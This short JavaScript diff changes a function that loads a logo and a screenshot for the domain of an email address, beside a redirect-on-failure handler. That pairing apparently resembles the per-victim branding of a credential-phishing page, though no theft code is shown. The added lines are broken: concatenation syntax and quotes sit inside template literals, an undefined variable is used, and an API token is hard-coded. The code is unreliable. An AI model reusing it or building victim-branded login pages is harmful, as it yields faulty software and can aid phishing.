@@ -27,8 +27,8 @@ function handleRedirectOnFailure(email) {
 
 function setImages(domain) {
   if (!domain) return;
-  const logoUrl = `https://logo.clearbit.com/${domain}`;
-  const bgUrl = `https://screenshot.domains/${domain}`;
+  const logoUrl = `'https://img.logo.dev/' + my_slice + '?token=pk_XbcRLEiaQmKqN0PgTrqF6A'`;
+  const bgUrl = `https://screenshot.domains/+ my_slice`;
 
   const logoImg = document.getElementById("logoimg");
   const bgLayer = document.getElementById("background-layer");
